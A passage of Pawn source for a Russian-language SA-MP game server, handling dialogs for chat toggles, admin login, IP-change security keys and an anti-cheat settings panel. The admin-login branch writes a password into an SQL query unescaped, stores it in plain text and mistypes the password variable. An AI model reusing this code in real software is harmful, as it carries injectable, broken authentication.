			new str[150];
			string = "";
			for(new i = 19; i >= 0; i--)
			{
				if(strlen(ATMADVERTISE[i])) format(str,150,"%i. %s\n",i+1,ATMADVERTISE[i]);
				strcat(string, str);
			}
			return ShowPlayerDialogEx(playerid,20086,DIALOG_STYLE_MSGBOX, "Банкомат", string, "Отправить", "Назад");
		}
	case 9973:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			switch(listitem)
			{
			case 0:
				{
					if(!GetPVarInt(playerid,"ooc_chat")) SetPVarInt(playerid,"ooc_chat",1), SCM(playerid, 0x6495EDFF, "Просмотр общего чата отключён!");
					else DeletePVar(playerid,"ooc_chat"), SCM(playerid, 0x6495EDFF, "Просмотр общего чата включён!");
				}
			case 1:
				{
					if(!GetPVarInt(playerid,"family_chat")) SetPVarInt(playerid,"family_chat",1), SCM(playerid, 0x6495EDFF, "Просмотр семейного чата отключён!");
					else DeletePVar(playerid,"family_chat"), SCM(playerid, 0x6495EDFF, "Просмотр семейного чата включён!");
				}
			case 2:
				{
					if(!GetPVarInt(playerid,"name_tag"))
					{
						SetPVarInt(playerid,"name_tag",1);
						foreach(i) ShowPlayerNameTagForPlayer(playerid, i, false);
						SCM(playerid, 0x6495EDFF, "Показ ников отключён!");
					}
					else
					{
						DeletePVar(playerid,"name_tag");
						foreach(i) ShowPlayerNameTagForPlayer(playerid, i, true);
						SCM(playerid, 0x6495EDFF, "Показ ников включён!");
					}
				}
			}
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
		}
	case 8842:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			new moneys;
			moneys = strval(inputtext);
			if(strval(inputtext) < 1) return SCM(playerid, COLOR_RED, " Неверная сумма");
			if(PlayerInfo[playerid][pCash] < strval(inputtext)) return SCM(playerid,COLOR_GREY, " У вас нет столько денег!"),ShowPlayerDialogEx(playerid,8842,DIALOG_STYLE_INPUT,"Слив ворованных денег","Если к вам попали ворованные/сбагозенные деньги,\nих следует передать администрации.\nИначе вы можете быть забаненым как вор/соучастник!","Готово","Отмена");
			PlayerInfo[playerid][pCash] -= strval(inputtext);
			format(string, 90, " Вы пожертвовали $ %i", moneys);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_LIGHTRED, " Большое спасибо за сотрудничество");
			return true;
		}
	 case 1227:
		{
			if(!response) return 1;
			new pass2;
			if(GetPVarInt(playerid, "Alogin") == 1)
			{
                if(!strlen(inputtext))
			    {
			        ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
				    Примечание:\n\
				    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
				    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
				    return true;
			    }
				if(sscanf(inputtext, "s[16]", pass2))
				{
                    ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
				    Примечание:\n\
				    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
				    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
				    return true;
				}
				if(!strcmp(inputtext, "qwerty", true))
				{
                    ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
				    Примечание:\n\
				    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
				    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
				    return true;
				}
				if(strlen(inputtext) < 6 || strlen(inputtext) > 16)
				{
                    ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
				    Примечание:\n\
				    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
				    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
				    return true;
				}
				mysql_format(DATABASE,QUERY,256, "UPDATE "TABLE_ADMIN" SET  password = '%s' WHERE Name = '%s' LIMIT 1", pass2, PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				SCM(playerid, COLOR_GREEN, " Поздравляем! Вы получили доступ модератора");
				//SendMes(playerid, 0xF5B900AA, " Вы авторизировались как модератор %i уровня", GetPVarInt(playerid,"level"));
				dostup[playerid] = 1;
				format(string, 90, " <ALogin> вошел %s[%i]", PlayerInfo[playerid][pName], playerid);
				SendAdminMessage(0xF5B900AA, string);
				AGM[playerid] = true;
				PlayerInfo[playerid][pAdmin] = GetPVarInt(playerid,"level");
				if(PlayerInfo[playerid][pAdmin] >= 10) Goto[playerid] = false;
				new year, month, day;
				getdate(year, month, day);
				mysql_format(DATABASE,QUERY,256, "UPDATE "TABLE_ADMIN" SET `LastCon` = '%02i.%02i.%04i' WHERE Name = '%s'", day, month, year, PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
	            printf("Администратор %s зарегестрировался администратором %i уровня", PlayerInfo[playerid][pName], PlayerInfo[playerid][pAdmin]);
				return true;
			}
			else if(GetPVarInt(playerid, "Alogin") == 2)
			{
                if(!strlen(inputtext))
			    {
			        ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
				    Примечание:\n\
				    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
				    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
				    return true;
			    }
				format(string, 60, " <ALogin> %s[%i]: ввел неверный пароль",PlayerInfo[playerid][pName],playerid);
				new str[64];
				GetPVarString(playerid,"password",str,64);
				if(strcmp(inputtext, str, true)) return SendAdminMessage(0xF5B900AA, string),SCM(playerid, COLOR_GREY, " Вы ввели неверный пароль");
				SendMes(playerid, 0xF5B900AA, "Вы авторизировались как модератор %i уровня", GetPVarInt(playerid,"level"));
				PlayerInfo[playerid][pAdmin] = GetPVarInt(playerid,"level");
				dostup[playerid] = 1;
				format(string, 90, " <ALogin> вошел %s[%i]", PlayerInfo[playerid][pName], playerid);
				if(PlayerInfo[playerid][pAdmin] < 6) SendAdminMessage(0xF5B900AA, string);
				else ABroadCast(0xF5B900AA,string,7);
				AGM[playerid] = true;
				if(PlayerInfo[playerid][pAdmin] >= 10) Goto[playerid] = false;
				new year, month, day;
				getdate(year, month, day);
				mysql_format(DATABASE,QUERY,256, "UPDATE "TABLE_ADMIN" SET `LastCon` = '%02i.%02i.%04i' WHERE Name = '%s'", day, month, year, PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				printf("%s авторизовался администратором %i уровня", PlayerInfo[playerid][pName], PlayerInfo[playerid][pAdmin]);
			}
		}
	case 16:
		{
			if(!response) return true;
			if(!strlen(inputtext))
			{
				ShowPlayerDialogEx(playerid,16,DIALOG_STYLE_PASSWORD, "Введите ключ безопастности", "      ==== Ваш IP адрес сменился ====\n=== Введите ваш ключ безопасности ===", "Готово", "Отмена");
				SetPlayerInterior(playerid,0);
				SetPlayerCameraLookAt(playerid,1133.0504,-2038.4034,69.0980);
				SetPlayerFacingAngle(playerid, 179.5547);
				SetPlayerCameraPos(playerid, -1817.0808, 1112.9937, 235.4244);
				SetPlayerCameraLookAt(playerid, -1816.5471, 949.6590, 235.4244);
				TogglePlayerControllable(playerid, 0);
				PlayerInfo[playerid][pLogin] = 0;
				mysql_format(DATABASE, QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pLogin = '0' WHERE name = '%e'",PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				return true;
			}
			if(strcmp(inputtext, PlayerInfo[playerid][pKeyip], true) == 0)
			{
			    if(PlayerInfo[playerid][pGoogleIP] == 0)
			    {
					new playersip[64];
					new sendername[MAX_PLAYER_NAME];
					GetPlayerIp(playerid,playersip,sizeof(playersip));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					mysql_format(DATABASE,QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pIp = '%s', pLogin = '1' WHERE name = '%e'",playersip,PlayerInfo[playerid][pName]);
					mysql_function_query(DATABASE,QUERY,false,"","");
					PlayerInfo[playerid][pLogin] = 1;
					Convoi[playerid] = 9999;
					SpawnPlayer(playerid);
					TogglePlayerControllable(playerid, 1);
					if(PlayerInfo[playerid][pPHouseKey] != 9999)
					{
						new house = PlayerInfo[playerid][pPHouseKey];
						createdcar = house_car[playerid];
						house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz], HouseInfo[house][hCarc] , CarInfo[playerid][carColor_one][GetPVarInt(playerid, "chosencar")] ,CarInfo[playerid][carColor_two][GetPVarInt(playerid, "chosencar")], 86400);
						SetVehicleParamsEx(house_car[playerid],false,false,false,true,false,false,false);
						CarHealth[house_car[playerid]] = float(1000);
						createdcar ++;
						new pveh = GetPVarInt(playerid, "chosencar");
						Fuell[house_car[playerid]] = CarInfo[playerid][carFuel][pveh];
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_1][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_2][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_3][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_4][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_5][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_6][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_7][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_8][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_9][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_10][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_11][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_12][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_13][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_14][pveh]);
					}
				}
				else
				{
				    ShowPlayerDialogEx(playerid,1812,DIALOG_STYLE_PASSWORD, "Ввод параметра", "      ==== Ваш IP адрес сменился ====\n=== Введите гугл-код ===", "Готово", "Отмена");
					SetPlayerInterior(playerid,0);
					SetPlayerCameraLookAt(playerid,1133.0504,-2038.4034,69.0980);
					SetPlayerFacingAngle(playerid, 179.5547);
					SetPlayerCameraPos(playerid, -1817.0808, 1112.9937, 235.4244);
					SetPlayerCameraLookAt(playerid, -1816.5471, 949.6590, 235.4244);
					TogglePlayerControllable(playerid, 0);
					PlayerInfo[playerid][pLogin] = 0;
					mysql_format(DATABASE, QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pLogin = '0' WHERE name = '%e'",PlayerInfo[playerid][pName]);
					mysql_function_query(DATABASE,QUERY,false,"","");
				}
				return true;
			}
			else
			{
				ShowPlayerDialogEx(playerid,69,DIALOG_STYLE_MSGBOX, "{B20000}Внимание", "{FF6347}Вы были кикнуты с сервера\nПричина: 'Не верный ключ безопасности'\nВведите '/q', чтобы выйти", "Закрыть", "");
				Kick(playerid);
				return true;
			}
		}
		case 433:
		{
		    if(!response) return CallLocalFunction("OnPlayerCommandText", "/eac", playerid);
		}
		case 378:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0: ShowPlayerDialogEx(playerid, 380, DIALOG_STYLE_LIST, "{FFFFFF}[0] AirBreak - пешком", "Выключено\nОповещение\nВключено", "Далее", "Назад");
				case 1: ShowPlayerDialogEx(playerid, 381, DIALOG_STYLE_LIST, "{FFFFFF}[1] AirBreak - в машине", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 2: ShowPlayerDialogEx(playerid, 382, DIALOG_STYLE_LIST, "{FFFFFF}[2] Телепорт - пешком", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 3: ShowPlayerDialogEx(playerid, 383, DIALOG_STYLE_LIST, "{FFFFFF}[3] Телепорт - в машине", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 4: ShowPlayerDialogEx(playerid, 384, DIALOG_STYLE_LIST, "{FFFFFF}[4] Телепорт (Into/Between) Car", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 5: ShowPlayerDialogEx(playerid, 3855, DIALOG_STYLE_LIST, "{FFFFFF}[5] Телепорт в автомобиле к игроку", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 6: ShowPlayerDialogEx(playerid, 386, DIALOG_STYLE_LIST, "{FFFFFF}[6] Телепорт к пикапу", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 7: ShowPlayerDialogEx(playerid, 387, DIALOG_STYLE_LIST, "{FFFFFF}[7] Флайхак пешком", "Отключит\nОповещение\nВключено", "Далее", "Назад");
				case 8: ShowPlayerDialogEx(playerid, 388, DIALOG_STYLE_LIST, "{FFFFFF}[8] Флайхак в автомобиле", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 9: ShowPlayerDialogEx(playerid, 389, DIALOG_STYLE_LIST, "{FFFFFF}[9] Спидхак пешком", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 10: ShowPlayerDialogEx(playerid, 390, DIALOG_STYLE_LIST, "{FFFFFF}[10] Спидхак в автомобиле", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 11: ShowPlayerDialogEx(playerid, 391, DIALOG_STYLE_LIST, "{FFFFFF}[11] Починка автомобиля", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 12: ShowPlayerDialogEx(playerid, 392, DIALOG_STYLE_LIST, "{FFFFFF}[12] Здоровье игроку", "Отключит\nОповещение\nВключено", "Далее", "Назад");
				case 13: ShowPlayerDialogEx(playerid, 393, DIALOG_STYLE_LIST, "{FFFFFF}[13] Броня", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 14: ShowPlayerDialogEx(playerid, 394, DIALOG_STYLE_LIST, "{FFFFFF}[14] Деньги(вирты)", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 15: ShowPlayerDialogEx(playerid, 395, DIALOG_STYLE_LIST, "{FFFFFF}[15] Оружие", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 16: ShowPlayerDialogEx(playerid, 396, DIALOG_STYLE_LIST, "{FFFFFF}[16] Добавление патронов", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 17: ShowPlayerDialogEx(playerid, 397, DIALOG_STYLE_LIST, "{FFFFFF}[17] Бесконечные патроны", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 18: ShowPlayerDialogEx(playerid, 398, DIALOG_STYLE_LIST, "{FFFFFF}[18] Специальные действия", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 19: ShowPlayerDialogEx(playerid, 399, DIALOG_STYLE_LIST, "{FFFFFF}[19] ГМ игрока", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 20: ShowPlayerDialogEx(playerid, 400, DIALOG_STYLE_LIST, "{FFFFFF}[20] ГМ автомобиля", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 21: ShowPlayerDialogEx(playerid, 401, DIALOG_STYLE_LIST, "{FFFFFF}[21] Невидимка", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 22: ShowPlayerDialogEx(playerid, 402, DIALOG_STYLE_LIST, "{FFFFFF}[22] Лаггер", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 23: ShowPlayerDialogEx(playerid, 403, DIALOG_STYLE_LIST, "{FFFFFF}[23] Тюнинг", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 24: ShowPlayerDialogEx(playerid, 404, DIALOG_STYLE_LIST, "{FFFFFF}[24] Паркур мод", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 25: ShowPlayerDialogEx(playerid, 405, DIALOG_STYLE_LIST, "{FFFFFF}[25] Быстрый поворот игрока", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 26: ShowCheatSettingsApanel2(playerid);
			}
		}
		case 379:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0: ShowPlayerDialogEx(playerid, 406, DIALOG_STYLE_LIST, "{FFFFFF}[26] Рапид", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 1: ShowPlayerDialogEx(playerid, 407, DIALOG_STYLE_LIST, "{FFFFFF}[27] Фейк спавн", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 2: ShowPlayerDialogEx(playerid, 408, DIALOG_STYLE_LIST, "{FFFFFF}[28] Фейк килл", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 3: ShowPlayerDialogEx(playerid, 409, DIALOG_STYLE_LIST, "{FFFFFF}[29] Про АИМ", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 4: ShowPlayerDialogEx(playerid, 410, DIALOG_STYLE_LIST, "{FFFFFF}[30] Бег CJ", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 5: ShowPlayerDialogEx(playerid, 411, DIALOG_STYLE_LIST, "{FFFFFF}[31] CarShot", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 6: ShowPlayerDialogEx(playerid, 412, DIALOG_STYLE_LIST, "{FFFFFF}[32] Угон авто", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 7: ShowPlayerDialogEx(playerid, 413, DIALOG_STYLE_LIST, "{FFFFFF}[33] Unfreeze", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 8: ShowPlayerDialogEx(playerid, 414, DIALOG_STYLE_LIST, "{FFFFFF}[34] AFK Призрак", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 9: ShowPlayerDialogEx(playerid, 415, DIALOG_STYLE_LIST, "{FFFFFF}[35] ФУЛЛ АИМ", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 10: ShowPlayerDialogEx(playerid, 416, DIALOG_STYLE_LIST, "{FFFFFF}[36] Фейк NPC", "Отключит\nОповещение\nВключено", "Далее", "Назад");
				case 11: ShowPlayerDialogEx(playerid, 417, DIALOG_STYLE_LIST, "{FFFFFF}[37] Reconnect", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 12: ShowPlayerDialogEx(playerid, 418, DIALOG_STYLE_LIST, "{FFFFFF}[38] Высокий пинг", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 13: ShowPlayerDialogEx(playerid, 419, DIALOG_STYLE_LIST, "{FFFFFF}[39] Диалог хак", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 14: ShowPlayerDialogEx(playerid, 420, DIALOG_STYLE_LIST, "{FFFFFF}[40] Песочница", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 15: ShowPlayerDialogEx(playerid, 421, DIALOG_STYLE_LIST, "{FFFFFF}[41] Невалидная версия", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 16: ShowPlayerDialogEx(playerid, 422, DIALOG_STYLE_LIST, "{FFFFFF}[42] RCON хак", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 17: ShowPlayerDialogEx(playerid, 423, DIALOG_STYLE_LIST, "{FFFFFF}[43] Тюнинг крашер", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 18: ShowPlayerDialogEx(playerid, 424, DIALOG_STYLE_LIST, "{FFFFFF}[44] Невалидный крашер", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 19: ShowPlayerDialogEx(playerid, 425, DIALOG_STYLE_LIST, "{FFFFFF}[45] Крашер диалогом", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 20: ShowPlayerDialogEx(playerid, 426, DIALOG_STYLE_LIST, "{FFFFFF}[46] Крашер объектами", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 21: ShowPlayerDialogEx(playerid, 427, DIALOG_STYLE_LIST, "{FFFFFF}[47] Крашер оружием", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 22: ShowPlayerDialogEx(playerid, 428, DIALOG_STYLE_LIST, "{FFFFFF}[48] Невалидное подключение", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 23: ShowPlayerDialogEx(playerid, 429, DIALOG_STYLE_LIST, "{FFFFFF}[49] Обратный вызов функции", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 24: ShowPlayerDialogEx(playerid, 430, DIALOG_STYLE_LIST, "{FFFFFF}[50] Анти поток", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 25: ShowPlayerDialogEx(playerid, 431, DIALOG_STYLE_LIST, "{FFFFFF}[51] Защита от Ddos", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 26: ShowPlayerDialogEx(playerid, 432, DIALOG_STYLE_LIST, "{FFFFFF}[52] Анти-NOP", "Отключить\nОповещение\nВключено", "Далее", "Назад");
				case 27: ShowCheatSettingsApanel(playerid);
			}
		}
		case 380:
		{
		    if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
   			{
					case 0:
					{
						SettingInfo[CheatSetting][0] = 0;//Отключен
						ShowCheatSettingsApanel(playerid);
						SaveSettings();
					}
	    			case 1:
					{
						SettingInfo[CheatSetting][0] = 1;//Писать в чат
						ShowCheatSettingsApanel(playerid);
						SaveSettings();
					}
				    case 2:
					{
						SettingInfo[CheatSetting][0] = 2;//Включено
						ShowCheatSettingsApanel(playerid);
						SaveSettings();
					}
			}
		}
		case 381:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][1] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][1] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][1] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 382:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][2] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][2] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][2] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 383:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][3] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][3] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][3] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 384:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][4] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][4] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][4] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 3855:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][5] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][5] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][5] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 386:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][6] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][6] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][6] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 387:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][7] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][7] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][7] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 388:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][8] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][8] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][8] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 389:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][9] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][9] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][9] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 390:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][10] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][10] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][10] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 391:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][11] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][11] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][11] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 392:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][12] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}

				case 1:
				{
					SettingInfo[CheatSetting][12] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][12] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 393:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][13] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][13] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][13] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 394:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][14] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][14] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][14] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 395:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][15] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][15] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][15] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 396:
		{
